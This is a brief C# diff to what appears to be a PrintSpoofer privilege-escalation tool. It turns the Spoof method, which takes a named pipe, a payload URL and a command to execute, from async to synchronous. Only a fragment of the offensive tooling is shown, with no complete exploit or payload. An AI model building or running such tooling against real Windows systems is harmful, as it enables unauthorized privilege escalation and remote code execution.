@@ -34,7 +34,7 @@ internal static class PrintSpoofer
         );
         var tasks = new List<Task>
         { 
-            Task.Run(async () => await Spoof(pipe, payloadUrl, executeCmd)),
+            Task.Run(() => Spoof(pipe, payloadUrl, executeCmd)),
             Task.Run(async () =>
             {
                 await Task.Delay(1000);
@@ -48,7 +48,7 @@ internal static class PrintSpoofer
         await Task.WhenAll(tasks);
     }
 
-    internal static async Task Spoof(string pipeName, string payloadUrl, string executeCmd = null)
+    internal static void Spoof(string pipeName, string payloadUrl, string executeCmd = null)
     {
         var pipe = Lib.CreateNamedPipe(
             pipeName,
